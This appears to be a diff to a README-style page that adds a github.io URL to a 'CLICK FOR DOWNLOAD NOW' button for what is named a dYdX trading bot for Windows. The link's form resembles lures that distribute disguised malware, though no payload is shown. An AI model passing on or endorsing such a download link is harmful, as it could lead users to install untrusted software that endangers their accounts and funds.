@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://dydx-trading-bot-pcwin-vl35.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
